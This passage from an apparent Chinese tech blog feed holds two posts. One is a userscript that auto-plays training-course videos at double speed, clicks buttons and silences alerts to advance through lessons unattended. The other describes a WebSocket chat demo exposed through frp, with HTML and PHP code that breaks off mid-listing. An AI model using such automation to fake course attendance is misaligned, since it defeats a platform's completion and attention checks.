<h3 id="持续执行的函数"><a href="#持续执行的函数" class="headerlink" title="持续执行的函数"></a>持续执行的函数</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(simulateClickOnPrimaryButton, <span class="number">3000</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(checkPlaybackRate, <span class="number">3000</span>);</span><br><span class="line"><span class="built_in">setInterval</span>(isVideoDurationEqual, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure>

<p>这三个函数让他每隔三秒重复执行就好了。其他的整个代码逻辑使用递归的方法让整个脚本持续运行</p>
<h2 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         AutoPlay</span></span><br><span class="line"><span class="comment">// @namespace    https://creeeeeeeeeeper.github.io/</span></span><br><span class="line"><span class="comment">// @version      1.0</span></span><br><span class="line"><span class="comment">// @description  Automatically play the next video in the video list.</span></span><br><span class="line"><span class="comment">// @author       ZYG</span></span><br><span class="line"><span class="comment">// @match        *://*/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// @run-at       document-idle</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Autoplay js start&#x27;</span>);</span><br><span class="line">    <span class="title function_">hasVideo</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">playv</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="title function_">play</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setInterval</span>(playv, <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(simulateClickOnPrimaryButton, <span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(checkPlaybackRate, <span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">setInterval</span>(isVideoDurationEqual, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">simulateClickOnPrimaryButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.fish-btn.fish-btn-primary&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (button) &#123;</span><br><span class="line">            <span class="keyword">const</span> classList = button.<span class="property">classList</span>;</span><br><span class="line">            <span class="keyword">if</span> (classList.<span class="title function_">contains</span>(<span class="string">&#x27;fish-input-search-button&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;按钮包含 fish-input-search-button 类，不进行点击&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">                    <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">                    <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">                    <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">                &#125;);</span><br><span class="line">                button.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 fish-btn fish-btn-primary 按钮&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查页面内是否有video元素</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hasVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 延时100毫秒再次检查</span></span><br><span class="line">            <span class="built_in">setTimeout</span>(hasVideo, <span class="number">500</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;再次检查&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 判断video元素内的视频是否在播放</span></span><br><span class="line">            <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (currentVideo.<span class="property">paused</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频未播放，开始自动播放...&#x27;</span>);</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">checkVideoPlaying</span>();</span><br><span class="line">                &#125;, <span class="number">500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查视频是否在播放</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkVideoPlaying</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkVideoPlaying调用&#x27;</span>);</span><br><span class="line">        <span class="comment">//const currentVideo = document.querySelector(&#x27;video&#x27;);</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// document.querySelector(&#x27;video&#x27;).play() </span></span><br><span class="line">            <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频开始播放&#x27;</span>);</span><br><span class="line">        &#125;, <span class="number">200</span>);</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">checkPlaybackRate</span>();<span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line">        &#125;, <span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">simulateClickOnVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (video) &#123;</span><br><span class="line">            <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">view</span>: <span class="variable language_">window</span>,</span><br><span class="line">                <span class="attr">bubbles</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">cancelable</span>: <span class="literal">true</span></span><br><span class="line">            &#125;);</span><br><span class="line">            video.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击 video 元素&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;未找到 video 元素&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测视频是否为2倍速播放</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkPlaybackRate</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>).<span class="property">playbackRate</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (currentVideo.<span class="property">playbackRate</span> == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;2倍速播放成功&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">setTimeout</span>(checkPlaybackRate, <span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">checkCourseLearned</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测本节课是否学过</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">checkCourseLearned</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;checkCourseLearned调用&#x27;</span>);</span><br><span class="line">        <span class="comment">// 查找所有具有指定类名的元素</span></span><br><span class="line">        <span class="keyword">const</span> items = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历这些元素</span></span><br><span class="line">        items.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 查找 &lt;i&gt; 标签</span></span><br><span class="line">            <span class="keyword">const</span> iElement = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查 &lt;i&gt; 标签的 title 属性是否为 &quot;已学完&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (iElement &amp;&amp; iElement.<span class="property">title</span> === <span class="string">&#x27;已学完&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;找到一个已学完的资源项:&#x27;</span>, item);</span><br><span class="line">                <span class="comment">// 如果这节课学完了，就播放下一节课</span></span><br><span class="line">                <span class="title function_">playNextVideo</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//如果这节课没学完，监听视频播放结束事件</span></span><br><span class="line">                <span class="title function_">listenVideoEnd</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听视频播放结束事件</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">listenVideoEnd</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> currentVideo = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;listenVideoEnd调用&#x27;</span>);</span><br><span class="line">        <span class="comment">// 监听视频播放结束事件</span></span><br><span class="line">        currentVideo.<span class="title function_">addEventListener</span>(<span class="string">&#x27;ended&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;当前视频播放结束，正在尝试播放下一个视频...&#x27;</span>);</span><br><span class="line">            <span class="title function_">playNextVideo</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 播放下一个视频</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">playNextVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;playNextVideo调用&#x27;</span>);</span><br><span class="line">        <span class="comment">// 找到当前激活的资源项</span></span><br><span class="line">        <span class="keyword">const</span> activeItem = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train.resource-item-active&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!activeItem) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到当前激活的资源项&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(activeItem)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 找到下一个资源项</span></span><br><span class="line">        <span class="keyword">let</span> nextItem = activeItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">        <span class="keyword">while</span> (nextItem &amp;&amp; (!nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item&#x27;</span>) || !nextItem.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;resource-item-train&#x27;</span>))) &#123;</span><br><span class="line">            nextItem = nextItem.<span class="property">nextElementSibling</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!nextItem) &#123;</span><br><span class="line">            <span class="comment">// 如果已经是最后一个，循环回到第一个</span></span><br><span class="line">            nextItem = activeItem.<span class="property">parentNode</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.resource-item.resource-item-train&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nextItem) &#123;</span><br><span class="line">            <span class="comment">// 模拟点击下一个资源项</span></span><br><span class="line">            <span class="title function_">simulateClick</span>(nextItem, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="comment">// 延时处理alert并播放视频</span></span><br><span class="line">                <span class="built_in">setTimeout</span>(handleAlertAndPlayVideo, <span class="number">3000</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有找到下一个资源项或资源项不符合条件&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">hasVideo</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟点击</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">simulateClick</span>(<span class="params">element, callback</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> clickEvent = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&#x27;click&#x27;</span>, &#123;</span><br><span class="line">            <span class="string">&#x27;view&#x27;</span>: <span class="variable language_">window</span>,</span><br><span class="line">            <span class="string">&#x27;bubbles&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;cancelable&#x27;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;);</span><br><span class="line">        element.<span class="title function_">dispatchEvent</span>(clickEvent);</span><br><span class="line">        <span class="comment">// 如果需要执行回调函数，确保点击事件处理完毕后执行</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(callback, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理alert并播放视频</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">handleAlertAndPlayVideo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// 这里假设alert是点击后弹出的，并且需要用户确认</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">alert</span>) &#123;</span><br><span class="line">            <span class="comment">// 模拟点击alert的确定按钮</span></span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span> (<span class="params">message</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;模拟点击alert确定按钮&#x27;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断视频播放时长是否等于总时长</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isVideoDurationEqual</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;video&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (video) &#123;</span><br><span class="line">            <span class="keyword">const</span> currentTime = video.<span class="property">currentTime</span>;</span><br><span class="line">            <span class="keyword">const</span> duration = video.<span class="property">duration</span>;</span><br><span class="line">            <span class="keyword">const</span> tolerance = <span class="number">1</span>; <span class="comment">// 允许的误差范围，单位为秒</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title class_">Math</span>.<span class="title function_">abs</span>(currentTime - duration) &lt;= tolerance) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;视频播放时长等于总时长&#x27;</span>);</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="comment">// 点击video元素，触发视频暂停</span></span><br><span class="line">                    <span class="title function_">simulateClickOnVideo</span>();</span><br><span class="line">                &#125;, <span class="number">3000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>安装篡改猴插件</p>
<p><img src="/2024/08/01/jsScript/image-20240802001948601.png" alt="image-20240802001948601"></p>
<p>打开管理面板</p>
<p><img src="/2024/08/01/jsScript/image-20240802002031717.png" alt="image-20240802002031717"></p>
<p>添加脚本</p>
<p><img src="/2024/08/01/jsScript/image-20240802002101858.png" alt="image-20240802002101858"></p>
<p>将代码扔进去，ctrl + s保存</p>
<p><img src="/2024/08/01/jsScript/image-20240802002125428.png" alt="image-20240802002125428"></p>
<p><img src="/2024/08/01/jsScript/image-20240802002214549.png" alt="image-20240802002214549"></p>
<p>启用</p>
<p><img src="/2024/08/01/jsScript/image-20240802002521991.png" alt="image-20240802002521991"></p>
<p>脚本成功运行</p>
<h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p>其实是懒得写还没实现的功能</p>
<p>比如：当最后一个课程学完后，需要打开下一个折叠的层</p>
<p><img src="/2024/08/01/jsScript/image-20240802003855298.png" alt="image-20240802003855298"><img src="/2024/08/01/jsScript/image-20240802003912394.png" alt="image-20240802003912394"></p>
<p>才能自动播放下一个折叠层中的视频</p>
<p>所以播放完一个视频应该先遍历一下所有<code>.resource-item.resource-item-train</code>的类中的所有<code>&lt;i&gt;</code>标签的title是否都为“已学完”，然后再找到折叠层的类，使用浏览器模拟点击让他折叠打开，然后再点击课程…………因为这里没必要所以没写</p>
<p>折叠层的类：<img src="/2024/08/01/jsScript/image-20240802004238259.png" alt="image-20240802004238259"></p>
<p>判断点击这里就可以实现自动展开了</p>
]]></content>
  </entry>
  <entry>
    <title>在内网搭建ws服务器出现的一些问题</title>
    <url>/2024/12/19/frp-CA/</url>
    <content><![CDATA[<p>WebSocket服务器搭建时的一些问题</p>
<span id="more"></span>

<p>在搭建自己的一个内网网站时，将这个网站通过<a href="https://www.natfrp.com/">Sakura Frp</a>穿了出去，因为Sakura_Frp开启隧道时打开了自动https（必须开不然访问不了网站），所以直接访问网站是https的，只不过会显示不安全（不受信任），网页还是可以正常访问的。</p>
<p>那么问题出在哪呢，昨天尝试在内网使用php写了一个websocket的聊天室demo，那么浏览器访问这个聊天室的时候先用https发送一个upgrade的请求，然后尝试websocket，但是通过frp的这个公网发送的请求，到了websocket会变成wss而不是ws，网页会返回状态码426，websocket尝试连接wss又不能强制转换成ws，使用frp访问网站也不能使用http访问，必须要https，所以应该需要搞一个CA证书。无法连接的报错如下：</p>
<blockquote>
<p>Mixed Content: The page at ‘<a href="https://frp-xxx.xxx:port/demoPage/">https://frp-xxx.xxx:port/demoPage/</a>‘  was loaded over HTTPS, but attempted to connect to the insecure WebSocket endpoint ‘ws:&#x2F;&#x2F;xxx.xxx.xxx.xxx:port&#x2F;chat’. This request has been blocked; this endpoint must be available over WSS. Uncaught DOMException: Failed to construct ‘WebSocket’: An insecure WebSocket connection may not be initiated from a page loaded over HTTPS.</p>
</blockquote>
<p><strong>已有配置：</strong>使用php和Apache搭建的网站（80端口），本地的80端口通过frp-xxx.xxx:port暴露在公网上，本地开启了一个简单的websocket服务器，ws服务器监听本地8081端口。</p>
<h5 id="第一次的思路"><a href="#第一次的思路" class="headerlink" title="第一次的思路"></a>第一次的思路</h5><p>想使用Apache反向代理，因为网站是在frp-xxx.xxx:port上的，所以使用Apache代理一个frp-xxx.xxx:port&#x2F;chat&#x2F;，将访问这个网址时的流量转发到本地的127.0.0.1:8081。</p>
<p>所以第一次的代码是这样写的：</p>
<p><strong>index.html：</strong>（这里没啥特殊的，放在这里可以抄一抄）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebSocket Chat Room<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#messages</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow-y</span>: scroll;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#messageInput</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">300px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#sendButton</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>WebSocket Chat Room<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;messages&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;messageInput&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Input Messages...&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;sendButton&quot;</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;chat.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>websocket-server.php：</strong>（放在这里也可以抄一下）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__DIR__</span>) . <span class="string">&#x27;/composerApp/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">Server</span>\<span class="title">IoServer</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">Http</span>\<span class="title">HttpServer</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">WebSocket</span>\<span class="title">WsServer</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">ConnectionInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Ratchet</span>\<span class="title">MessageComponentInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chat</span> <span class="keyword">implements</span> <span class="title">MessageComponentInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$clients</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;clients = <span class="keyword">new</span> <span class="title class_">\SplObjectStorage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onOpen</span>(<span class="params">ConnectionInterface <span class="variable">$conn</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;clients-&gt;<span class="title function_ invoke__">attach</span>(<span class="variable">$conn</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;新连接! (<span class="subst">&#123;$conn-&gt;resourceId&#125;</span>)\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onMessage</span>(<span class="params">ConnectionInterface <span class="variable">$from</span>, <span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;clients <span class="keyword">as</span> <span class="variable">$client</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$from</span> !== <span class="variable">$client</span>) &#123;</span><br><span class="line">                <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">send</span>(<span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onClose</span>(<span class="params">ConnectionInterface <span class="variable">$conn</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;clients-&gt;<span class="title function_ invoke__">detach</span>(<span class="variable">$conn</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;连接 <span class="subst">&#123;$conn-&gt;resourceId&#125;</span> 已断开\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onError</span>(<span class="params">ConnectionInterface <span class="variable">$conn</span>, \<span class="built_in">Exception</span> <span class="variable">$e</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;发生错误: <span class="subst">&#123;$e-&gt;getMessage()&#125;</span>\n&quot;</span>;</span><br><span class="line">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$server</span> = <span class="title class_">IoServer</span>::<span class="title function_ invoke__">factory</span>(</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HttpServer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">WsServer</span>(</span><br><span class="line">            <span class="keyword">new</span> <span class="title 